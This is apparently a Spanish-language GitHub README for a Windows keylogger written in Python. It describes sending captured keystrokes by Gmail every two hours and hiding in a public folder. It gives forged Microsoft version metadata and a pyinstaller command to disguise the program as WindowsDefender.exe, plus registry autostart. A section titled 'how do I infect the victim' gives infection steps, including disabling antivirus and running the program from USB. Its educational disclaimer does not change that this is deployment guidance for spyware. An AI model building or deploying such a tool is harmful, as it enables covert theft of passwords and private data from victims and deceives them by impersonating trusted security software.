# Keylogger para Windows - Python
__Actual:__  `v2.1`

__Documentación actualizada:__ `02-05-2020`


__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de "Seguridad de sistemas informáticos", no me hago responsable de un posible mal uso de ésta herramienta.

Las razones del uso de un Keylogger son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.

## Carpeta Principal
![Archivos](https://i.imgur.com/fvVMi8N.png)
- `icon.ico`    = Icono Windows Defender
- `KeyloggerWindows.py` = Código fuente del Keylogger
- `LICENCE` = Licencia 
- `README.md`= Documentación
- `StartUp.reg` = Modifica el Registro de Windows
- `version.txt` = Información detalla de conversión `.py` a `.exe`
- `WindowsDefender.exe` = Keylogger Compilado 

## Caracteristicas
- __Envío por Gmail:__ Envía el registro de teclas por Gmail.
- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de notas se envíe a varios correos a la vez,
- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
- __Tiempo de envío personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea que se envíe los archivos, `No se recomienta que sean muy seguidos, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, éstas horas se cuentan despues de iniciar el script`
- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `log.txt`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por debuggeo, pero al ser convertida a `*.exe` se utilizara un comando para que ésta se ejecute en segundo plano.
- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender"` , y en esa carpeta encuentras el archivo `log.txt`.
- __Iniciar automaticamente con el sistema:__ Se encuentra un archivo llamado `StartUp.reg`, la cual al ejecutarlo, ésta escribe el registro y permite que el keylogger se ejecute al iniciar sesión.
- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.


## Caracteristicas en futuras actualizaciones: 
- __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
- __Conexión FTP:__ Envía el archivo `log.txt` vía FTP.
- __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
- __Portapapeles:__ Obtiene el texto del portapapeles.

## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
![Uso del CPU y RAM](https://i.imgur.com/xMRxzX3.png)


# Proceso de preparación:
Requerimiento de paquetes de `Python3`:
- `import pynput`
- `import getuser`
- `import datetime`
- `import os`
- `import time`
- `import yagmail`
- `import socket`
- `import threading`

## Pasos para elegir su correo
1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
2. Use  `git clone https://github.com/SebastianEPH/Keylogger-py.git` para descargar el repositorio en su computadora.

3. Abra el archivo `KeyloggerWindows.py` en su editor de texto.
4. Busque la función `SendLog()` y ahí encontrará las siguientes lineas de código, las cuales debe modificar, el correo primario remitente, el correo segundario remitente y el o los correos receptores.

````py
# Correo de envío [Principal]      <=> Se enviará 
    sender_email_P       = "Send123@gmail.com"   # <<== Cambia éste correo
    sender_password_P    = "contraseña"          # <<== Contraseña del correo 

    # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
    sender_email_S       = "Sendabc@gmail.com"   # <<== Cambia éste correo
    sender_password_S    = "contraseña"          # <<== Contraseña del correo 

    # Correo o correos que recibirán el registro de datos `log.txt`
    receiver_email   = ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"] # MultiCorreo
  # receiver_email   = ["correo@gmail.com"]  # SingleCorreo
````

# Proceso de conversión: `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `version.txt` = Información detallada del keyloger.
    
    Ambos archivos son importantes para ocultar el `keylogger` o tratar de hacerlo pasar cómo un programa que no es, así como la siguiente imagen:

    ![Imagen1](https://i.imgur.com/4ytoK3h.png)
    ![Imagen2](https://i.imgur.com/1Dj2Tat.png)

    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
````t
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft Corporation'),
        StringStruct(u'FileDescription', u'Windows Security Health Host Key'),
        StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
        StringStruct(u'InternalName', u'Windows Defender'),
        StringStruct(u'LegalCopyright', u'\xa9 Microsoft Corporation. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
        StringStruct(u'ProductName', u'Microsoft\xae Windows\xae Operating System'),
        StringStruct(u'ProductVersion', u'6.1.7601.17514')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
````
3. __Conversión final:__
Mediante Consola debe dirigirse a la carpeta principal.
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:

    ````r
    pyinstaller --clean   --distpath "Keylogger Terminado" -F --windowed --icon icon.ico --version-file version.txt KeyloggerWindows.py
    ````

# ¿Cómo infecto a la victima?
![Final files](https://i.imgur.com/7GJz3De.png)
- Usten tendrá al finalizar 2 archivos:
- El archivo llamado `WindowsDefender.exe` es el keylogger.
- El archivo llamado , modifica el registro de windows, y hace que el keylogger se ejecute siempre al iniciar el usuario.

## Procedimiento de infección:
- Usten guardará esos archivos en un USB
- Es necesario desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el keylogger se estará replicando enla ruta.
- Lo siguiente es darle 2 click al archiv `StartUp.reg`, y ésto hará que el registro de windows sea modificado y el keylogger se ejecute 
- __Nota:__ No hay un orden fijo, usted puede ejecutar primero el archivo `WindowsDefender.exe` cómo el archivo `StartUp.reg` y  ésto no causará ningún problema.


<!-- Creador  -->
---
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)